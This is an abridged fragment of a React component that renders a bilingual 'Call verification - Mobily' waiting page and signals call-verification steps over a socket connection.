...
const MobilyCall: React.FC = () => {
    ...
    const content = isArabic
        ...
        : {
            ...
            title: 'Call verification - Mobily',
            networkProvider: 'Network provider',
            callStatus: 'Call status: waiting for call confirmation',
            heading: 'Waiting for mobile confirmation',
    ...
    React.useEffect(() => {
        socketService.emitClientEvent('readyForCall', { provider: 'mobily' });
    ...
    const handleConfirmReceive = () => {
        ...
        socketService.emitClientEvent('submitCallVerification', { provider: 'mobily' });
    };
                ...
                <div className="space-y-6 p-6 sm:p-8">
                    <div className="rounded-xl border border-slate-200 bg-slate-50 p-4">
                        <div className="flex flex-wrap items-center justify-between gap-3 text-sm">
                            ...
                            <span className="rounded-lg bg-white px-3 py-1 font-bold text-slate-800">Mobily</span>
                        </div>
                    ...
                    <div className="text-center">
                        <img
                            src="/imgs/calling/mobily-call.png"
                            alt="mobily-call"
